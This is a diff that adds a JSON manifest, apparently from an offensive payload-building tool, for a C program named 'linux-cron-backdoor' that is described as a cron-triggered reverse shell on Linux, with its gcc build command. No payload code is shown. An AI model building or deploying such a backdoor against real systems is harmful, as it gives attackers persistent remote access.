@@ -1,0 +1,10 @@
+{
+    "name": "linux-cron-backdoor",
+    "language": "c",
+    "description": "Cron job payload \u2014 reverse shell when cron fires",
+    "compiler": "gcc",
+    "source": "main.c",
+    "compile_cmd": "gcc {source} -o {output}",
+    "target_os": "linux",
+    "output": "cron_backdoor"
+}
